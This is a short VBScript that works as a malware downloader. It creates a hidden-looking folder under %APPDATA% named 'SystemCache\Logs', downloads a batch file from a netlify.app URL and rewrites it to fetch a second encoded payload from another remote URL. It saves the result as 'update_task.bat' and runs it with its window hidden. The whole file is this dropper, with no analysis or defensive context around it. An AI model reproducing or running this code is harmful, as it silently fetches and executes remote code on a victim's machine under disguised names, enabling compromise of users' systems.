' Define required objects

Set shell = CreateObject("WScript.Shell")

Set fso = CreateObject("Scripting.FileSystemObject")



' Define the target folder

logFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\SystemCache\Logs"



' Create folders if they don't exist

If Not fso.FolderExists(logFolder) Then

    parentFolder = Left(logFolder, InStrRev(logFolder, "\") - 1)

    If Not fso.FolderExists(parentFolder) Then fso.CreateFolder parentFolder

    fso.CreateFolder logFolder

End If



' Download the BAT file

Set http = CreateObject("MSXML2.XMLHTTP")

http.Open "GET", "https://website-code.netlify.app/code/final.bat", False

http.Send



' Prepare the stream to write file

Set stream = CreateObject("ADODB.Stream")

stream.Type = 1

stream.Open

stream.Write http.responseBody

stream.Position = 0



' Convert to text and perform string replacement

stream.Type = 2

stream.Charset = "utf-8"

stream.Position = 0

batCode = stream.ReadText

batCode = Replace(batCode, "****", "'https://vbs-output.netlify.app/code/encoded.txt'")



' Save the modified script

stream.Position = 0

stream.SetEOS

stream.WriteText batCode

stream.SaveToFile logFolder & "\update_task.bat", 2



' Run the BAT file silently

shell.Run Chr(34) & logFolder & "\update_task.bat" & Chr(34), 0, False

